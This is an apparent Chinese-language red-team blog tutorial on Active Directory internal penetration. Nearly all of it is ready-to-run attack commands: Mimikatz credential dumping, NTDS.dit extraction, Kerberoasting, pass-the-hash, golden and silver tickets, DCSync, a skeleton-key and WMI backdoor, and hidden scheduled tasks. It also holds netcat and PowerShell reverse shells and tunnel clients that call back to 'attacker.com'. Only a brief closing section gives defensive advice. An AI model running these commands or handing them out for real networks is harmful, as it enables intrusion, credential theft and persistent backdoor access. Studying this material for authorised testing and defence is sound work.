---
title: "内网渗透实战指南"
date: 2026-04-22 00:00:00
author: PFinal南丞
description: "深入学习内网渗透技术，掌握域环境渗透、横向移动、权限维持、隧道搭建等核心技能，理解内网攻击的完整流程。"
keywords:
  - 内网渗透
  - 横向移动
  - Active Directory
  - 域渗透
  - 权限维持
  - 隧道技术
tags:
  - internal-pentest
  - active-directory
  - lateral-movement
  - red-team
---

# 内网渗透实战指南

内网渗透是渗透测试的高级阶段，攻击者已经进入目标网络内部，需要进一步扩展权限、横向移动并获取敏感数据。

## 内网环境概述

### 网络架构

```
┌─────────────────────────────────────────────────────────────┐
│                        互联网                                │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│                      边界防火墙                              │
└───────────────────────┬─────────────────────────────────────┘
                        │
        ┌───────────────┼───────────────┐
        ▼               ▼               ▼
┌──────────────┐ ┌──────────────┐ ┌──────────────┐
│   DMZ区域    │ │   办公网     │ │   生产网     │
│  Web服务器   │ │  员工PC      │ │  数据库      │
│  邮件服务器  │ │  域控制器    │ │  核心业务    │
└──────────────┘ └──────────────┘ └──────────────┘
```

### 域环境组件

| 组件 | 功能 | 攻击价值 |
|------|------|----------|
| Domain Controller | 域控制器，管理身份认证 | ⭐⭐⭐⭐⭐ |
| DNS Server | 域名解析 | ⭐⭐⭐ |
| DHCP Server | IP 地址分配 | ⭐⭐ |
| File Server | 文件共享 | ⭐⭐⭐⭐ |
| Exchange Server | 邮件服务 | ⭐⭐⭐⭐ |

## 信息收集

### 网络发现

```powershell
# 主机发现
nmap -sn 192.168.1.0/24
fping -a -g 192.168.1.0/24 2>/dev/null

# 端口扫描
nmap -sS -sV -O 192.168.1.0/24
masscan 192.168.1.0/24 -p1-65535 --rate=1000

# NetBIOS 扫描
nbtscan 192.168.1.0/24
```

### 域信息收集

```powershell
# 判断是否在域中
systeminfo | findstr /B /C:"Domain"

# 获取域信息
net view /domain
net view /domain:DOMAIN_NAME
net group /domain
net user /domain

# PowerView 收集
Import-Module PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetComputer
Get-NetUser
Get-NetGroup
Get-NetShare
Get-NetSession
```

### BloodHound 分析

```powershell
# 收集数据
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# 分析结果
# 在 BloodHound GUI 中导入生成的 zip 文件
# 分析攻击路径：
# - Shortest Paths to Domain Admin
# - Find Principals with DCSync Rights
# - Kerberoastable Users
```

## 凭证获取

### 本地凭证

```powershell
# Mimikatz 提取
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

# Procdump + Mimikatz
procdump -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# LaZagne
laZagne.exe all
```

### 哈希获取

```powershell
# 本地 SAM
mimikatz # lsadump::sam
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# NTDS.dit
# 方法一：VSS
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit

# 方法二：NTDSUtil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# 提取哈希
mimikatz # lsadump::ntds /ntds:ntds.dit /system:system.save
```

### Kerberoasting

```powershell
# 请求 SPN 票据
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"

# 导出票据
mimikatz # kerberos::list /export

# 离线破解
python3 tgsrepcrack.py wordlist.txt ticket.kirbi
hashcat -m 13100 hash.txt wordlist.txt
```

## 横向移动

### Pass the Hash

```bash
# Impacket
pth-winexe -U DOMAIN/administrator%aad3b435b51404eeaad3b435b51404ee:HASH //192.168.1.10 cmd
psexec.py -hashes :HASH DOMAIN/administrator@192.168.1.10
wmiexec.py -hashes :HASH DOMAIN/administrator@192.168.1.10
smbexec.py -hashes :HASH DOMAIN/administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H HASH
crackmapexec smb 192.168.1.0/24 -u administrator -H HASH -x "whoami"
```

### Pass the Ticket

```powershell
# 导入票据
mimikatz # kerberos::ptt ticket.kirbi

# 使用票据
klist
dir \\dc01.domain.com\c$
```

### Overpass the Hash

```powershell
# 使用 NTLM 哈希获取 Kerberos TGT
mimikatz # sekurlsa::pth /user:administrator /domain:domain.com /ntlm:HASH /run:cmd.exe
```

### DCOM 横向

```powershell
# 枚举 DCOM 应用
$dcom = Get-CimInstance Win32_DCOMApplication

# 利用 Excel 的 DCOM
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.1.10"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c calc")
```

### WMI 横向

```powershell
# 执行命令
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName 192.168.1.10 -Credential $cred

# 使用 wmiexec
wmiexec.py domain/admin:password@192.168.1.10
```

### PsExec 横向

```powershell
# 上传并执行
psexec.exe \\192.168.1.10 -u domain\admin -p password cmd.exe

# Impacket 版本
psexec.py domain/admin:password@192.168.1.10
```

### 计划任务横向

```powershell
# 创建计划任务
schtasks /create /s 192.168.1.10 /u domain\admin /p password /tn "Update" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00
schtasks /run /s 192.168.1.10 /u domain\admin /p password /tn "Update"
```

## 域权限提升

### Kerberos 攻击

#### AS-REP Roasting

```powershell
# 查找不需要预认证的账户
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 请求 TGT
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 破解
hashcat -m 18200 asrep.txt wordlist.txt
```

#### Golden Ticket

```powershell
# 获取 krbtgt 哈希
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# 制作金票
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:513,512,520,518,519 /ptt

# 使用金票
klist
ls \\dc01.domain.com\c$
```

#### Silver Ticket

```powershell
# 制作银票（针对特定服务）
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /target:sql.domain.com /service:MSSQLSvc /rc4:HASH /ptt
```

#### DCSync

```powershell
# 执行 DCSync 攻击
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.com /all

# Secretsdump
secretsdump.py domain/admin:password@dc01.domain.com
```

### ACL 滥用

```powershell
# 查找 ACL 攻击路径
Find-InterestingDomainAcl

# 利用 GenericAll 权限
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker -Credential $cred

# 利用 WriteDacl 权限
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity attacker -Rights DCSync
```

## 权限维持

### 持久化技术

#### 黄金票据持久化

```powershell
# 定期更新金票（每 10 年）
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
```

#### 域控 Skeleton Key

```powershell
# 安装万能钥匙
mimikatz # privilege::debug
mimikatz # misc::skeleton

# 使用万能密码 "mimikatz" 登录任何域账户
net use \\dc01.domain.com\c$ /user:domain\administrator mimikatz
```

#### DSRM 后门

```powershell
# 同步 DSRM 密码与域管
ntdsutil "set dsrm password" "sync from domain account administrator" q q

# 使用 DSRM 登录
mimikatz # token::elevate
mimikatz # lsadump::sam
```

### 后门技术

#### WMI 事件订阅

```powershell
# 创建 WMI 后门
$filterName = 'UpdateFilter'
$consumerName = 'UpdateConsumer'

$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name=$filterName; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName; CommandLineTemplate='C:\Windows\System32\payload.exe'}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer}
```

#### 计划任务后门

```powershell
# 创建隐藏计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
```

## 隧道搭建

### 端口转发

```bash
# SSH 本地转发
ssh -L 8080:internal.server:80 user@jump.host

# SSH 远程转发
ssh -R 9090:localhost:3000 user@vps.server

# SSH 动态转发（SOCKS 代理）
ssh -D 1080 user@jump.host
```

### 反向 Shell

```bash
# Netcat
nc -e /bin/sh attacker.com 4444
nc -e cmd.exe attacker.com 4444

# PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 隧道工具

```bash
# Chisel
# 服务端
./chisel server -p 8080 --reverse

# 客户端
./chisel client http://attacker.com:8080 R:socks

# FRP
# 服务端
./frps -c frps.ini

# 客户端
./frpc -c frpc.ini

# ligolo-ng
# 服务端
./proxy -selfcert

# 客户端
./agent -connect attacker.com:11601 -ignore-cert
```

## 防御建议

### 1. 网络分段

```
- 实施 VLAN 隔离
- 限制跨网段访问
- 部署内部防火墙
```

### 2. 凭证保护

```
- 使用 LAPS 管理本地管理员密码
- 实施 PTH 防护（KB2871997）
- 启用 Credential Guard
```

### 3. 监控检测

```
- 部署 SIEM 系统
- 监控异常登录行为
- 检测横向移动特征
```

### 4. 域安全加固

```
- 保护 krbtgt 账户
- 启用 PAC 验证
- 实施 AD 权限审核
```

## 总结

内网渗透是高级渗透测试的核心内容，掌握域环境渗透、横向移动和权限维持技术对于安全评估至关重要。

---

**参考资源：**
- [Active Directory Security](https://adsecurity.org/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
